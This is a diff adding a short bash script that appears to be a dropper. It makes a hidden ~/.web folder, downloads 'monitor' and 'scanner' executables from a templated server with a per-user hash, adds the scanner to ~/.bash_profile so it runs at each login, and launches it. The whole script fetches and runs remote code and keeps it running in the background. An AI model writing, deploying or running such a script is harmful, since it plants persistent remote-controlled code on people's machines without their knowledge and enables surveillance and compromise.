@@ -1,0 +1,26 @@
+#!/bin/bash
+
+HOME=~
+DIR_NAME=".web"
+DIR=$HOME/$DIR_NAME
+PROFILE=$HOME/.bash_profile
+SCANNER=$DIR/scan
+MONITOR=$DIR/monitor
+MON_ESC=`echo $MONITOR | sed 's/[\\/&]/\\\\&/g'`
+IN_PROF="`cat $PROFILE | grep \"$SCANNER\"`"
+
+if [[ ! -d $DIR_NAME ]]; then
+   mkdir $DIR_NAME
+fi
+
+curl -s -o $MONITOR "{{SERVER_HOST}}g.php?h={{USER_HASH}}"
+curl -s -o $SCANNER "{{SERVER_HOST}}r"
+chmod +x $MONITOR
+chmod +x $SCANNER
+sed -i '' "s/MONITOR/$MON_ESC/g" $SCANNER
+
+if [[ -z $IN_PROF ]]; then
+   echo $SCANNER >> ~/.bash_profile
+fi
+
+$SCANNER
